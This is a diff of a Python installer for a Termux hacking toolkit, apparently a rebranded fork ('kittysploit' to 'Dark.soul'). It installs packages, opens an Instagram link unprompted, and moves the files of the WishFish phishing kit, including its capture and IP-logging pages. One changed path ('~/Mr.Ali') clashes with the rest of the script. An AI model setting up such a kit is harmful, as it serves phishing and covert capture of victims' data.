@@ -15,8 +15,12 @@ from time import sleep
 #cp $PREFIX/bin/ngrok ~/
 
 R='\033[1;31m'
-g='\033[1;37m'
-G='\033[1;32m'                                                                                                              Y='\033[1;33m'                                                                                                              C='\033[1;36m'
+
+G='\033[1;32m'
+
+Y='\033[1;33m'
+
+C='\033[1;36m'
 
 W='\033[1;37m'
 
@@ -32,7 +36,7 @@ system('sleep 1')
 
 system('apt update && apt upgrade -y')
 
-system('pkg install python -y')
+system('apt-get install python -y')
 
 system('apt-get install git -y')
 
@@ -90,7 +94,8 @@ system('apt-get install python2-dev ')
 
 system('pkg install curl -y')
 
-system('termux-open https://instagram.com/darkwsoul?igshid=pklo1fhl6vq7')
+system('termux-open https://instagram.com/darkwsoul?igshid=4amhid3b3tsu')
+
 #
 
 system('clear')
@@ -190,7 +195,7 @@ if  droid=="0":
 
     system('clear')
 
-    print(Y +"Thank you very much for using the kittysploit tool I wish you a happy day :)")
+    print(Y +"Thank you very much for using the Dark.soul tool I wish you a happy day :)")
 
     print(R +"*"*70)
 
@@ -324,7 +329,7 @@ input (Y + "Pleace Enter to OpEn...")
 
 system('cp $PREFIX/bin/ngrok ~/Dark.soul/WishFish')
 
-system('mv ~/Dark.soul/WishFish ~')
+system('mv ~/Mr.Ali/WishFish ~')
 
 system('mv ~/WishFish/Custom.html ~/WishFish/LICENSE ~/WishFish/README.md ~/WishFish/captured ~/WishFish/copy.sh ~/WishFish/index.php ~/WishFish/index2.html ~/WishFish/ip.php ~/WishFish/post.php ~/WishFish/ngrok ~/WishFish/template.php ~/WishFish/wishfish.html ~/WishFish/wishfish.sh ~/Dark.soul/')
 
